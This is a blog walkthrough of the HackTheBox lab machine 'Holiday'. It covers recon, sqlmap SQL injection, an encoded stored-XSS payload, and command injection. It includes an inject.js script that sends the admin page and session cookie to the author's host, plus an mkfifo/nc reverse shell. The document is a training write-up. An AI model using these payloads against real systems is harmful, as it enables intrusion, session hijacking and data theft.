---
title: "Walk-through of Holiday from HackTheBox"
header:
  teaser: /assets/images/2020-06-19-15-26-55.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - XSS
  - Burp
  -
  -
---

## Machine Information

![holiday](/assets/images/2020-06-19-15-26-55.png)

Holiday is one of the most difficult machines currently on HackTheBox. The XSS knowledge required to get your initial shell is complex for anyone not familiar with evading defenses. Skills required are an intermediate knowledge of Linux, basic knowledge of Nodejs and NPM. Skills learned are bypassing user agent filtering, XSS filtering, and obtaining data with stored XSS.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 0022- Hard - Holiday](https://www.hackthebox.eu/home/machines/profile/22) |
| Machine Release Date | 2nd June 2017 |
| Date I Completed It | 18th June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/news/kali-linux-2020-1-release/) |

## Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/holiday# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.25 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/holiday# nmap -p$ports -v -sC -sV -oA holiday 10.10.10.25

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 12:26 BST
Initiating Ping Scan at 12:26
Scanning 10.10.10.25 [4 ports]
Completed Ping Scan at 12:26, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:26
Completed Parallel DNS resolution of 1 host. at 12:26, 0.02s elapsed
Initiating SYN Stealth Scan at 12:26
Scanning 10.10.10.25 [2 ports]
Discovered open port 22/tcp on 10.10.10.25
Discovered open port 8000/tcp on 10.10.10.25
Completed SYN Stealth Scan at 12:26, 0.06s elapsed (2 total ports)
Initiating Service scan at 12:26
Scanning 2 services on 10.10.10.25
Completed Service scan at 12:26, 11.09s elapsed (2 services on 1 host)
Nmap scan report for 10.10.10.25
Host is up (0.022s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Check out port 8000:

![holiday_website](/assets/images/2020-06-19-16-14-40.png)

Check source of page:

![holiday_website_source](/assets/images/2020-06-19-16-15-21.png)

Nothing interesting, but can see picture is in a subfolder called img. Try gobuster to see what we can find:

```text
root@kali:~# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.25:8000
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.25:8000
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/13 12:29:23 Starting gobuster
===============================================================
===============================================================
2020/06/13 12:29:30 Finished
===============================================================
```

Gobuster didn't find anything, even though we know there is at least one subfolder. Try dirb to see if we find anything with that:

```text
root@kali:~# dirb http://10.10.10.25:8000
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Sat Jun 13 13:32:17 2020
URL_BASE: http://10.10.10.25:8000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.25:8000/ ----
+ http://10.10.10.25:8000/admin (CODE:302|SIZE:28)
+ http://10.10.10.25:8000/Admin (CODE:302|SIZE:28)
+ http://10.10.10.25:8000/ADMIN (CODE:302|SIZE:28)
+ http://10.10.10.25:8000/agent (CODE:302|SIZE:28)
+ http://10.10.10.25:8000/css (CODE:301|SIZE:165)
+ http://10.10.10.25:8000/img (CODE:301|SIZE:165)
+ http://10.10.10.25:8000/js (CODE:301|SIZE:163)
+ http://10.10.10.25:8000/login (CODE:200|SIZE:1171)
+ http://10.10.10.25:8000/Login (CODE:200|SIZE:1171)
+ http://10.10.10.25:8000/logout (CODE:302|SIZE:28)
-----------------
END_TIME: Sat Jun 13 13:33:59 2020
DOWNLOADED: 4612 - FOUND: 10
```

Found subfolders, after playing around I realise gobuster has a default User Agent that doesn't contain the word Linux, if I try again it also finds the subfolders:

```text
root@kali:~# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.25:8000 -a Linux
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.25:8000
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     Linux
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/13 12:29:35 Starting gobuster
===============================================================
http://10.10.10.25:8000/img (Status: 301)
http://10.10.10.25:8000/login (Status: 200)
http://10.10.10.25:8000/admin (Status: 302)
http://10.10.10.25:8000/css (Status: 301)
http://10.10.10.25:8000/js (Status: 301)
http://10.10.10.25:8000/logout (Status: 302)
http://10.10.10.25:8000/Login (Status: 200)
http://10.10.10.25:8000/agent (Status: 302)
http://10.10.10.25:8000/Admin (Status: 302)
http://10.10.10.25:8000/Logout (Status: 302)
http://10.10.10.25:8000/LogIn (Status: 200)
http://10.10.10.25:8000/Agent (Status: 302)
http://10.10.10.25:8000/LOGIN (Status: 200)
===============================================================
2020/06/13 12:35:33 Finished
===============================================================
```

## Gaining Access

Mystery solved, now to look at what I've found and /login sounds interesting so start with that:

![holiday_signin](/assets/images/2020-06-19-16-15-49.png)

A login page, send to Burp to play with:

![burp_login](/assets/images/2020-06-19-16-16-41.png)

Interesting that it says invalid user, so response differentiates between invalid user and password, means I might be able to brute force. Next try some SQL injection:

![burp_incorrect_password](/assets/images/2020-06-19-16-17-25.png)

Response reveals a username, and we see we also got it to evaluate the second parameter. Time to fire up sqlmap, first send this Burp request to a file:

![burp_save_to_file](/assets/images/2020-06-19-16-17-55.png)

Now use it with sqlmap

```text
root@kali:~/htb/holiday# sqlmap -r login.req --level=5 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 14:05:23 /2020-06-13/
[14:05:23] [INFO] parsing HTTP request from 'login.req'
[14:05:24] [INFO] testing connection to the target URL
[14:05:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:05:24] [INFO] testing if the target URL content is stable
[14:05:24] [INFO] target URL content is stable
[14:05:24] [INFO] testing if POST parameter 'username' is dynamic
[14:05:24] [WARNING] POST parameter 'username' does not appear to be dynamic
[14:05:24] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[14:05:24] [INFO] testing for SQL injection on POST parameter 'username'
[14:05:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:05:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:05:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[14:05:32] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Invalid User")
[14:05:33] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
[14:05:40] [INFO] testing 'Generic inline queries'
[14:05:40] [INFO] testing 'SQLite inline queries'
[14:05:40] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[14:05:40] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[14:05:40] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[14:05:40] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'

[14:06:38] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable
[14:06:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:06:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:06:41] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[14:06:42] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[14:06:43] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[14:06:44] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[14:06:44] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[14:06:45] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[14:06:46] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[14:06:47] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[14:06:47] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[14:06:48] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[14:06:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 465 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin") OR NOT 3120=3120 AND ("lOLW"="lOLW&password=admin

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=admin") OR 4218=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("ZgnW"="ZgnW&password=admin
---
[14:06:49] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
```

We have identified the database, now try to get the tables:

```text
root@kali:~/htb/holiday# sqlmap -r login.req --level=5 --risk=3 --tables --dbms=SQLite --threads 10
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 14:11:12 /2020-06-13/
[14:11:12] [INFO] parsing HTTP request from 'login.req'
[14:11:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin") OR NOT 3120=3120 AND ("lOLW"="lOLW&password=admin

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=admin") OR 4218=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("ZgnW"="ZgnW&password=admin
---
[14:11:12] [INFO] testing SQLite
[14:11:12] [INFO] confirming SQLite
[14:11:12] [INFO] actively fingerprinting SQLite
[14:11:12] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[14:11:12] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:11:12] [INFO] fetching number of tables for database 'SQLite_masterdb'
[14:11:12] [INFO] resumed: 5
[14:11:12] [INFO] retrieving the length of query output
[14:11:12] [INFO] resumed: 5
[14:11:12] [INFO] resumed: users
[14:11:12] [INFO] retrieving the length of query output
[14:11:12] [INFO] resumed: 15
[14:11:12] [INFO] resumed: sqlite_sequence
[14:11:12] [INFO] retrieving the length of query output
[14:11:12] [INFO] resumed: 5
[14:11:12] [INFO] resumed: notes
[14:11:12] [INFO] retrieving the length of query output
[14:11:12] [INFO] resumed: 8
[14:11:12] [INFO] resumed: bookings
[14:11:12] [INFO] retrieving the length of query output
[14:11:12] [INFO] resumed: 8
[14:11:12] [INFO] resumed: sessions
Database: SQLite_masterdb
[5 tables]
+-----------------+
| bookings        |
| notes           |
| sessions        |
| sqlite_sequence |
| users           |
+-----------------+
```

Now we have the tables let's dump the contents of the user one:

```text
root@kali:~/htb/holiday# sqlmap -r login.req --level=5 --risk=3 -T users --dump --dbms=SQLite --threads=10
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.6.6#dev}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:43:52 /2020-06-14/
[22:43:52] [INFO] parsing HTTP request from 'login.req'
[22:43:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin") OR NOT 3120=3120 AND ("lOLW"="lOLW&password=admin

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=admin") OR 4218=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("ZgnW"="ZgnW&password=admin
---
[22:43:54] [INFO] testing SQLite
[22:43:54] [INFO] confirming SQLite
[22:43:54] [INFO] actively fingerprinting SQLite
[22:43:54] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[22:43:54] [INFO] retrieving the length of query output
[22:43:54] [INFO] resumed: 103
[22:43:54] [INFO] resumed: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active TINYINT(1))
[22:43:54] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
[22:43:54] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[22:43:54] [INFO] retrieved: 1
[22:43:55] [INFO] retrieving the length of query output
[22:43:55] [INFO] retrieved: 1
[22:43:56] [INFO] retrieved: 1
[22:43:57] [INFO] retrieving the length of query output
[22:43:57] [INFO] retrieved: 1
[22:43:57] [INFO] retrieved: 1
[22:43:58] [INFO] retrieving the length of query output
[22:43:58] [INFO] retrieved: 1
[22:43:58] [INFO] retrieved: 1
[22:43:59] [INFO] retrieving the length of query output
[22:43:59] [INFO] retrieved: 32
[22:44:06] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
[22:44:06] [INFO] retrieving the length of query output
[22:44:06] [INFO] retrieved: 5
[22:44:08] [INFO] retrieved: RickA
[22:44:08] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:44:56] [INFO] writing hashes to a temporary file '/tmp/sqlmapTeuAcx3385/sqlmaphashes-zSyUmd.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q]
[22:45:01] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[22:45:06] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]
[22:45:12] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[22:45:12] [INFO] starting 2 processes
[22:47:34] [WARNING] no clear password(s) found
Database: SQLite_masterdb
Table: users
[1 entry]
+----+---+--------+----------+----------------------------------+
| id | 1 | active | username | password                         |
+----+---+--------+----------+----------------------------------+
| 1  | 1 | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
+----+---+--------+----------+----------------------------------+
[22:47:34] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.sqlmap/output/10.10.10.25/dump/SQLite_masterdb/users.csv'
[22:47:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.25'
[*] ending @ 22:47:34 /2020-06-14/
```

We now have a username and a hashed password, see if we can [crack it](https://md5hashing.net/hash/md5/fdc8cd4cff2c19e0d1022e78481ddf36):

![crack_hash](/assets/images/2020-06-19-16-18-26.png)

We can now go back to login page and use these credentials, we end up at the Bookings page. Hovering over the first link we see the URL:

![holiday_bookings](/assets/images/2020-06-19-16-19-19.png)

Clicking on the UUID link we get this:

![holiday_bookings_details](/assets/images/2020-06-19-16-19-44.png)

Clicking on Notes section we see this:

![booking_add_note](/assets/images/2020-06-19-16-20-07.png)

It says the approval process can take up to a minute, so assume there is something automated running on a timer to do this. Try Javascript to see if we can XSS:

![booking_javascript](/assets/images/2020-06-19-16-21-55.png)

Wait a minute and refresh the page to see our note:

![notes_output](/assets/images/2020-06-19-16-22-23.png)

There's some sort of XSS protection on the website which has broken the input. Try a few things out from [this big list](https://gist.github.com/JohannesHoppe/5612274) of XSS evasions.

Results not good for any of them:

```text
&lt;img src="blah/&gt;&lt;script&gt;javascript.alert(0)&lt;/script&gt;

"""document.write('&lt;script src="http://10.10.14.35/test.js"&gt;&lt;/script&gt;');"""

"""<img src=blah />&lt;script src="http://10.10.14.35/test.js"&gt;&lt;/script&gt;"""

&lt;img src="blah/''&lt;script&gt;javascript:alert(1)&lt;/script&gt;"'')

"""&lt;img src="blah/''&lt;script&gt;javascript:alert(1)&lt;/script&gt;"'')"""
```

Looking at the list again, we see it's common to use the img tag, so try that:

![notes_img_src](/assets/images/2020-06-19-16-23-16.png)

After a minute we get a hit on our waiting web server:

```text
root@kali:~/htb/holiday# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.25 - - [18/Jun/2020 21:12:07] "GET / HTTP/1.1" 200 -
```

Checking the notes page:

![notes_good_output](/assets/images/2020-06-19-16-23-49.png)

That works, looking at [this cheat sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) we should try using charcode. Our simple payload will be:

```text
document.write('<script src="http://10.10.14.35/inject.js"></script>');
```

This will create javascript that will try to grab the inject.js file from my waiting webserver. Now we need to convert the payload to evade the protection. Use iPython to do this:

```text
root@kali:~/htb/holiday# ipython3

Python 3.7.7 (default, Apr  1 2020, 13:48:52)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: def createEncodedJS(ascii)
   ...:    decimal_string = ""
   ...:    for char in ascii:
   ...:        decimal_string += str(ord(char)) + ","
   ...:    return decimal_string[:-1]
```

This will take an input of ascii, and go through it one character at a time outputting the equivalent charcode for it.

Now use this to convert the payload further up:

```text
In [2]: createEncodedJS("""document.write('<script src="http://10.10.14.35/inject.js"></script>');""")
```

In to charcode:

```text
Out[2]: '100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,53,47,105,110,106,101,99,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
```

Now we hide this in an img tag:

```text
<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,53,47,105,110,106,101,99,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
```

Now we need to create the inject.js file that the box will pull from us:

```text
root@kali:~/htb/holiday# cat inject.js
var url = "http://127.0.0.1:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65";
$.ajx({method: "GET",url: url.success: function(data)
{ s.post("http://10.10.14.35", data);}});
```

Now submit the above payload in the Notes section of the website, and watch our waiting NetCat listener, where we soon see the connection to us:

```text
root@kali:~/htb/holiday# nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.25] 38012
GET /inject.js HTTP/1.1
Accept: */*
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.35
```

We now know we can pull a file and the server executes the Javascript in it. Let's do another script, this time to grab the cookie of the admin process on the box that approves the notes:

```text
root@kali:~/htb/holiday# cat inject.js
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65', false);
req1.send();
var response = req1.responseText;
var req2 = new XMLHttpRequest();
var params = "cookie=" + encodeURIComponent(response);
req2.open('POST', 'http://10.10.14.35:8000/pencer', true);
req2.setRequestHeader('Content-Type', 'text/plain');
req2.send(params);
```

Here we are getting the box to pull this script from our waiting web server on port 80, then POST a response back to a waiting NetCat listener on port 8000. The contents of that POST will contain a URL encoded page, which includes the cookie of the admin service that runs every minute.

Get things set up on Kali, submit the note, and fingers crossed we get our response captured in a file. First we see a hit on the webserver:

```text
root@kali:~/htb/holiday# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.25 - - [18/Jun/2020 21:59:09] "GET /inject.js HTTP/1.1" 200 -
```

Then we receive the POST to NetCat, which dumps it to a file:

```text
root@kali:~/htb/holiday# nc -nlvp 8000 | tee -a response.txt
listening on [any] 8000 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.25] 38934
POST /pencer HTTP/1.1
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
Origin: http://localhost:8000
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Content-Type: text/plain
Accept: */*
Content-Length: 31068
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.35:8000

cookie=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%20%20%3Chead%3E%0A%20%20%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%20%20%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%20%20%3Ctitle%3EBooking%20Management%3C%2Ftitle%3E%0A%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D1.0%22%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3D%22%2Fcss%2Fbootstrap.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3D%22%2Fcss%2Fmain.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fbootstrap.min.js%22%3E%3C%2Fscript%3E%0A%20%20%3C%2Fhead%3E%0A%0A%20%20%3Cbody%3E%0A%20%20%
<SNIP>
```

Now we need to decode the response so we can retrieve the cookie, back to iPython:

```text
root@kali:~/htb/holiday# ipython3
Python 3.7.7 (default, Apr  1 2020, 13:48:52)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: import urllib
In [2]: urllib.parse.unquote("""cookie=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%20%20%3Chead%3E%0A%20%20%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%20%20%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20co
   ...: ntent%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%20%20%3Ctitle%3EBooking%20Management%3C%2Ftitle%3E%0A%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D
   ...: 1.0%22%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3D%22%2Fcss%2Fbootstrap.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3
   ...: D%22%2Fcss%2Fmain.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fbootstrap.min.js%22%3E%3C%2Fscript%3E%0A%20%20%3C%2Fhead
   ...:
<SNIP>
```

Decodes to this:

```text
<SNIP>
<input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A3aeeba40-b1a7-11ea-ad03-b74792d4303b.LnDoH7DEcRwKysftNhTHau7AtjawCJknIr1cMHOWCqY">\n
<SNIP>
```

Use the cookie in the response above in Cookie Editor:

![cookie_editor](/assets/images/2020-06-19-16-27-20.png)

Hit F5 to refresh the page and a new Admin button appears:

![bookings_details](/assets/images/2020-06-19-16-27-50.png)

Clicking on that doesn't reveal anything:

![bookings_admin_pane](/assets/images/2020-06-19-16-28-12.png)

However if we try to access the /admin URL we found earlier we now get to a new section:

![bookings_admin_section](/assets/images/2020-06-19-16-28-47.png)

Clicking the two buttons will export the bookings and notes from the system:

```text
root@kali:~/htb/holiday# more export-bookings-1592429801323
1|e2d3f450-bdf3-4c0a-8165-e8517c94df9a|Wilber Schowalter|A697I|Werner.Walsh56@gmail.com|183.0|1497933864607|1498458169878|Alishabury
2|2332eef6-0f05-413a-aac1-ac5772e9dd8a|Sedrick Homenick|3RMYF|Hermann.Gutmann@gmail.com|847.0|1515149552629|1520893749909|New Dedric
3|ffd52467-9fa2-4b9a-90f7-995cbc705055|Miss Gisselle West|PP9VY|Gordon2@hotmail.com|502.0|1515329040778|1521227597426|West Jammie
<SNIP>

root@kali:~/htb/holiday# more export-notes-1592429796838
1|31|<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,53,47,104,111,108,105,1
00,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">|1592426141451|1
2|31|<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,53,47,105,110,106,101,99,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59;</script>">|1592427885495|1
<SNIP>
```

Send to Burp so we can have a look:

![burp_export_table](/assets/images/2020-06-19-16-29-11.png)

Let's try adding a whoami to the GET parameter on line 1:

![burp_try_whoami](/assets/images/2020-06-19-16-29-38.png)

Doesn't work, but does reveal which characters are allowed. Do CTRL+U to URL encode the &, this time it works for an ls:

![burp_url_encode](/assets/images/2020-06-19-16-30-09.png)

Now to get a shell from kali, A dot (.) Is not allowed. So we will need to convert our IP to hex instead, can use [this site](https://www.browserling.com/tools/ip-to-hex), which shows us that 10.10.14.35 = 0a.0a.0e.23 (0x0a0a0e23)

Test it:

```text
root@kali:~/htb/holiday# ping 0x0a0a0e23
PING 0x0a0a0e23 (10.10.14.35) 56(84) bytes of data.
64 bytes from 10.10.14.35: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 10.10.14.35: icmp_seq=2 ttl=64 time=0.024 ms
64 bytes from 10.10.14.35: icmp_seq=3 ttl=64 time=0.023 ms
```

## User Flag

Works, so now we need a shell, use one from Pentest Monkey:

```text
root@kali:~/htb/holiday# cat shell
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.35 1234 >/tmp/f
```

First make the box grab the shell script from us:

![burp_wget_shell](/assets/images/2020-06-19-16-31-17.png)

Now get it to run the script using Bash:

![burp_connect_to_shell](/assets/images/2020-06-19-16-31-50.png)

On our waiting NC listener we get a connection:

```text
root@kali:~/htb/holiday# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.25] 57848
/bin/sh: 0: can't access tty; job control turned off
$ whoami
algernon
```

Finally we have a shell, upgrade to a proper tty shell first, then grab the user flag:

```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
algernon@holiday:~/app$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~/htb/holiday# stty raw -echo

algernon@holiday:~/app$ ls /home/algernon
app  user.txt
algernon@holiday:~/app$ cat /home/algernon/user.txt
<<HIDDEN>>
```

Now look for our path to privilege escalation, first thing I usually check is sudo and SUID:

```text
algernon@holiday:~/app$ sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
```

Straight away we look to have found it. Anyone can run npm with no password as root, and there's a well known method to run scripts as part of an npm install.

Sort the files out first:

```text
algernon@holiday:~/app$ ls
